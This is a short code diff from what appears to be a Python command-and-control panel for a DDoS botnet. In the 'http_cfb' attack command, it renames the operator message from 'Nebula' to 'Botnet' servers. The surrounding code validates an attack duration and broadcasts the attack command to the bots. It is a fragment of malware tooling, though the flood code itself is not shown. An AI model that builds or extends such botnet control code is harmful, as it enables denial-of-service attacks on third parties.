@@ -7,7 +7,7 @@ def http_cfb(args, validate_time, send, client, ansi_clear, broadcast, data):
         secs = args[3]
         if validate_time(secs):
             send(client, ansi_clear, False)
-            send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Nebula {Fore.LIGHTWHITE_EX}servers!")
+            send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Botnet {Fore.LIGHTWHITE_EX}servers!")
             broadcast(data)
         else:
             send(client, Fore.RED + 'Invalid attack duration (1-1200 seconds)')
